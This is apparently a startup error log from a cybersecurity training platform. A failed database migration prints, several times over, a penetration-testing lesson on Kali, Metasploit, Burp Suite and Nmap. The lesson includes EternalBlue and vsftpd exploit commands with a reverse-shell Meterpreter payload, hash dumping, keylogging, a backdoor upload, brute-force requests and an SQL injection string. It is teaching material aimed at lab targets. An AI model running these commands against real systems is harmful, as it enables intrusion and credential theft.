password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin' OR '1'='1
7. Observe response for SQL errors or unexpected behavior
8. If vulnerable, escalate to full exploitation
```

## 4. Nmap (Network Mapper)

### Overview

Nmap is the industry-standard tool for network discovery and security auditing.

### Basic Scans

```bash
# Ping scan (discover live hosts)
nmap -sn 192.168.1.0/24

# TCP SYN scan (stealth scan)
nmap -sS 192.168.1.100

# Service version detection
nmap -sV 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 192.168.1.100

# Scan specific ports
nmap -p 80,443,8080 192.168.1.100

# Scan all ports
nmap -p- 192.168.1.100
```

### NSE (Nmap Scripting Engine)

```bash
# Vulnerability scanning
nmap --script vuln 192.168.1.100

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100

# HTTP enumeration
nmap --script http-enum 192.168.1.100

# SSL/TLS testing
nmap --script ssl-enum-ciphers -p 443 192.168.1.100
```

### Output Formats

```bash
# Normal output
nmap -oN scan_results.txt 192.168.1.100

# XML output (for parsing)
nmap -oX scan_results.xml 192.168.1.100

# Grepable output
nmap -oG scan_results.gnmap 192.168.1.100

# All formats
nmap -oA scan_results 192.168.1.100
```

## Tool Selection Matrix

| Phase | Primary Tool | Alternative | Purpose |
|-------|--------------|-------------|---------|
| Reconnaissance | Nmap | Masscan | Network discovery |
| Web Testing | Burp Suite | OWASP ZAP | Web app security |
| Exploitation | Metasploit | Manual exploits | Vulnerability exploitation |
| Password Cracking | Hashcat | John the Ripper | Credential attacks |
| Post-Exploitation | Meterpreter | PowerShell Empire | Maintain access |

## Hands-On Lab Exercise

### Setup Your Testing Environment

**Step 1: Install Kali Linux**
```bash
# Download Kali Linux VM
# Import into VirtualBox/VMware
# Update system
sudo apt update && sudo apt upgrade -y
```

**Step 2: Install Metasploitable 2 (Vulnerable Target)**
```bash
# Download from SourceForge
# Import into same virtual network as Kali
# Default credentials: msfadmin/msfadmin
```

**Step 3: Practice Scanning**
```bash
# From Kali, scan Metasploitable
nmap -sV -A <metasploitable-ip>

# Identify open services
# Note vulnerable versions
```

**Step 4: Exploit a Vulnerability**
```bash
# Start Metasploit
msfconsole

# Search for vsftpd exploit (known vulnerability in Metasploitable)
search vsftpd

# Use the exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <metasploitable-ip>
exploit

# You should get a shell!
```

## Best Practices

### 1. Tool Maintenance
```bash
# Update Kali Linux regularly
sudo apt update && sudo apt full-upgrade -y

# Update Metasploit
msfupdate
```

### 2. Documentation
- Screenshot every step
- Save all command output
- Document findings immediately
- Use tools like CherryTree or KeepNote

### 3. Legal Compliance
- Only test systems you have permission to test
- Stay within defined scope
- Report findings responsibly
- Maintain confidentiality

### 4. Continuous Learning
- Follow security blogs (Offensive Security, Rapid7)
- Practice on legal platforms (HackTheBox, TryHackMe)
- Attend security conferences (DEF CON, Black Hat)
- Obtain certifications (OSCP, CEH, GPEN)

## Common Mistakes to Avoid

1. **Running scans without permission** → Legal consequences
2. **Using default settings** → Easily detected
3. **Not documenting findings** → Incomplete reports
4. **Ignoring false positives** → Wasted time
5. **Over-relying on automated tools** → Missing manual vulnerabilities

## Resources for Further Learning

### Official Documentation
- Kali Linux: https://www.kali.org/docs/
- Metasploit: https://docs.metasploit.com/
- Burp Suite: https://portswigger.net/burp/documentation
- Nmap: https://nmap.org/book/

### Practice Platforms
- HackTheBox: https://www.hackthebox.eu/
- TryHackMe: https://tryhackme.com/
- PentesterLab: https://pentesterlab.com/
- VulnHub: https://www.vulnhub.com/

### Video Tutorials
- IppSec (HackTheBox walkthroughs)
- The Cyber Mentor
- John Hammond
- LiveOverflow

## Quiz Preparation

Test your knowledge:

1. What is the difference between Kali Linux and a regular Linux distribution?
2. Name three phases of penetration testing and the primary tool for each.
3. What is Meterpreter and why is it powerful?
4. How does Burp Suite''s Proxy component work?
5. What is the purpose of Nmap''s NSE scripts?

## Next Steps

In the next module, you''ll learn **Reconnaissance and Information Gathering** techniques, where you''ll use these tools to discover information about target systems before attempting exploitation.

Remember: **With great power comes great responsibility.** Always use these tools ethically and legally!'
WHERE section_id = 1 AND name = 'Penetration Testing Tools Overview'

	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.handleException(DefaultSqlScriptExecutor.java:270)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:225)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.execute(DefaultSqlScriptExecutor.java:128)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.executeOnce(SqlMigrationExecutor.java:68)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.lambda$execute$0(SqlMigrationExecutor.java:57)
	at org.flywaydb.core.internal.database.DefaultExecutionStrategy.execute(DefaultExecutionStrategy.java:27)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.execute(SqlMigrationExecutor.java:56)
	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:374)
	... 30 common frames omitted
Caused by: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
	at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2712)
	at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:2400)
	at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:367)
	at org.postgresql.jdbc.PgStatement.executeInternal(PgStatement.java:498)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:415)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:335)
	at org.postgresql.jdbc.PgStatement.executeCachedSql(PgStatement.java:321)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:297)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:292)
	at org.flywaydb.core.internal.jdbc.JdbcTemplate.executeStatement(JdbcTemplate.java:210)
	at org.flywaydb.core.internal.sqlscript.ParsedSqlStatement.execute(ParsedSqlStatement.java:97)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:213)
	... 36 common frames omitted
2026-03-12 00:53:22.867 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Starting CyberSkill Platform...
2026-03-12 00:53:22.869 [vert.x-eventloop-thread-1] INFO  com.cyberskill.config.AppConfig - Application properties loaded successfully
2026-03-12 00:53:22.980 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Running database migrations...
2026-03-12 00:53:23.089 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - Flyway OSS Edition 10.4.1 by Redgate
2026-03-12 00:53:23.090 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - 
2026-03-12 00:53:23.090 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - See release notes here: https://rd.gt/416ObMi
2026-03-12 00:53:23.273 [vert.x-eventloop-thread-1] INFO  org.flywaydb.core.FlywayExecutor - Database: jdbc:postgresql://localhost:5432/cyberskill (PostgreSQL 16.3)
2026-03-12 00:53:23.332 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.JdbcTableSchemaHistory - Schema history table "public"."flyway_schema_history" does not exist yet
2026-03-12 00:53:23.337 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbValidate - Successfully validated 7 migrations (execution time 00:00.046s)
2026-03-12 00:53:23.361 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.JdbcTableSchemaHistory - Creating Schema History table "public"."flyway_schema_history" ...
2026-03-12 00:53:23.517 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Current version of schema "public": << Empty Schema >>
2026-03-12 00:53:23.545 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "1 - Initial Schema"
2026-03-12 00:53:23.993 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "2 - Sample Learning Content"
2026-03-12 00:53:24.048 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "3 - Additional Learning Paths"
2026-03-12 00:53:24.083 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "4 - Enhanced Lesson Content"
2026-03-12 00:53:24.103 [vert.x-eventloop-thread-1] ERROR o.f.core.internal.command.DbMigrate - Migration of schema "public" to version "4 - Enhanced Lesson Content" failed! Changes successfully rolled back.
2026-03-12 00:53:24.110 [vert.x-eventloop-thread-1] ERROR com.cyberskill.MainVerticle - ✗ Database migration failed
org.flywaydb.core.internal.command.DbMigrate$FlywayMigrateException: Migration V4__Enhanced_Lesson_Content.sql failed
------------------------------------------------
SQL State  : 22P02
Error Code : 0
Message    : ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
Location   : db/migration/V4__Enhanced_Lesson_Content.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V4__Enhanced_Lesson_Content.sql)
Line       : 210
Statement  : UPDATE lessons SET content = 
'# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you''ll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world''s most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin' OR '1'='1
7. Observe response for SQL errors or unexpected behavior
8. If vulnerable, escalate to full exploitation
```

## 4. Nmap (Network Mapper)

### Overview

Nmap is the industry-standard tool for network discovery and security auditing.

### Basic Scans

```bash
# Ping scan (discover live hosts)
nmap -sn 192.168.1.0/24

# TCP SYN scan (stealth scan)
nmap -sS 192.168.1.100

# Service version detection
nmap -sV 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 192.168.1.100

# Scan specific ports
nmap -p 80,443,8080 192.168.1.100

# Scan all ports
nmap -p- 192.168.1.100
```

### NSE (Nmap Scripting Engine)

```bash
# Vulnerability scanning
nmap --script vuln 192.168.1.100

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100

# HTTP enumeration
nmap --script http-enum 192.168.1.100

# SSL/TLS testing
nmap --script ssl-enum-ciphers -p 443 192.168.1.100
```

### Output Formats

```bash
# Normal output
nmap -oN scan_results.txt 192.168.1.100

# XML output (for parsing)
nmap -oX scan_results.xml 192.168.1.100

# Grepable output
nmap -oG scan_results.gnmap 192.168.1.100

# All formats
nmap -oA scan_results 192.168.1.100
```

## Tool Selection Matrix

| Phase | Primary Tool | Alternative | Purpose |
|-------|--------------|-------------|---------|
| Reconnaissance | Nmap | Masscan | Network discovery |
| Web Testing | Burp Suite | OWASP ZAP | Web app security |
| Exploitation | Metasploit | Manual exploits | Vulnerability exploitation |
| Password Cracking | Hashcat | John the Ripper | Credential attacks |
| Post-Exploitation | Meterpreter | PowerShell Empire | Maintain access |

## Hands-On Lab Exercise

### Setup Your Testing Environment

**Step 1: Install Kali Linux**
```bash
# Download Kali Linux VM
# Import into VirtualBox/VMware
# Update system
sudo apt update && sudo apt upgrade -y
```

**Step 2: Install Metasploitable 2 (Vulnerable Target)**
```bash
# Download from SourceForge
# Import into same virtual network as Kali
# Default credentials: msfadmin/msfadmin
```

**Step 3: Practice Scanning**
```bash
# From Kali, scan Metasploitable
nmap -sV -A <metasploitable-ip>

# Identify open services
# Note vulnerable versions
```

**Step 4: Exploit a Vulnerability**
```bash
# Start Metasploit
msfconsole

# Search for vsftpd exploit (known vulnerability in Metasploitable)
search vsftpd

# Use the exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <metasploitable-ip>
exploit

# You should get a shell!
```

## Best Practices

### 1. Tool Maintenance
```bash
# Update Kali Linux regularly
sudo apt update && sudo apt full-upgrade -y

# Update Metasploit
msfupdate
```

### 2. Documentation
- Screenshot every step
- Save all command output
- Document findings immediately
- Use tools like CherryTree or KeepNote

### 3. Legal Compliance
- Only test systems you have permission to test
- Stay within defined scope
- Report findings responsibly
- Maintain confidentiality

### 4. Continuous Learning
- Follow security blogs (Offensive Security, Rapid7)
- Practice on legal platforms (HackTheBox, TryHackMe)
- Attend security conferences (DEF CON, Black Hat)
- Obtain certifications (OSCP, CEH, GPEN)

## Common Mistakes to Avoid

1. **Running scans without permission** → Legal consequences
2. **Using default settings** → Easily detected
3. **Not documenting findings** → Incomplete reports
4. **Ignoring false positives** → Wasted time
5. **Over-relying on automated tools** → Missing manual vulnerabilities

## Resources for Further Learning

### Official Documentation
- Kali Linux: https://www.kali.org/docs/
- Metasploit: https://docs.metasploit.com/
- Burp Suite: https://portswigger.net/burp/documentation
- Nmap: https://nmap.org/book/

### Practice Platforms
- HackTheBox: https://www.hackthebox.eu/
- TryHackMe: https://tryhackme.com/
- PentesterLab: https://pentesterlab.com/
- VulnHub: https://www.vulnhub.com/

### Video Tutorials
- IppSec (HackTheBox walkthroughs)
- The Cyber Mentor
- John Hammond
- LiveOverflow

## Quiz Preparation

Test your knowledge:

1. What is the difference between Kali Linux and a regular Linux distribution?
2. Name three phases of penetration testing and the primary tool for each.
3. What is Meterpreter and why is it powerful?
4. How does Burp Suite''s Proxy component work?
5. What is the purpose of Nmap''s NSE scripts?

## Next Steps

In the next module, you''ll learn **Reconnaissance and Information Gathering** techniques, where you''ll use these tools to discover information about target systems before attempting exploitation.

Remember: **With great power comes great responsibility.** Always use these tools ethically and legally!'
WHERE section_id = 1 AND name = 'Penetration Testing Tools Overview'

	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:382)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$applyMigrations$1(DbMigrate.java:272)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.core.internal.command.DbMigrate.applyMigrations(DbMigrate.java:271)
	at org.flywaydb.core.internal.command.DbMigrate.migrateGroup(DbMigrate.java:244)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$migrateAll$0(DbMigrate.java:139)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:73)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.lambda$execute$0(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.database.postgresql.PostgreSQLConnection.lock(PostgreSQLConnection.java:96)
	at org.flywaydb.core.internal.schemahistory.JdbcTableSchemaHistory.lock(JdbcTableSchemaHistory.java:144)
	at org.flywaydb.core.internal.command.DbMigrate.migrateAll(DbMigrate.java:139)
	at org.flywaydb.core.internal.command.DbMigrate.migrate(DbMigrate.java:97)
	at org.flywaydb.core.Flyway.lambda$migrate$0(Flyway.java:202)
	at org.flywaydb.core.FlywayExecutor.execute(FlywayExecutor.java:215)
	at org.flywaydb.core.Flyway.migrate(Flyway.java:147)
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:243)
	at com.cyberskill.MainVerticle.start(MainVerticle.java:87)
	at io.vertx.core.impl.DeploymentManager.lambda$doDeploy$5(DeploymentManager.java:210)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:276)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:258)
	at io.vertx.core.impl.ContextInternal.lambda$runOnContext$0(ContextInternal.java:56)
	at io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:173)
	at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:166)
	at io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:569)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
Caused by: org.flywaydb.core.internal.sqlscript.FlywaySqlScriptException: Migration V4__Enhanced_Lesson_Content.sql failed
------------------------------------------------
SQL State  : 22P02
Error Code : 0
Message    : ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
